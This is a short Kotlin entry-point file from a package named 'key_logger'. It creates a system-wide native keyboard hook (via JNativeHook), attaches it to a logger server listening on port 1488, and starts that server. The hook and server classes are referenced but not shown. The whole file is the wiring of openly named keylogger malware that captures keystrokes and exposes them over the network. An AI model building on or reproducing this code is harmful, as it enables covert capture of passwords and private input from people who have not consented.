package aler.key_logger

import aler.key_logger.hook.NativeHook
import aler.key_logger.server.LoggerServer
import org.jnativehook.GlobalScreen
import java.util.logging.Level
import java.util.logging.Logger

val nativehook = NativeHook()
//val appshook = ApplicationHook()
val server = LoggerServer(1488)

fun main(args: Array<String>) {
    server.AddProvider(nativehook)
//    server.AddProvider(appshook)
    server.start()
}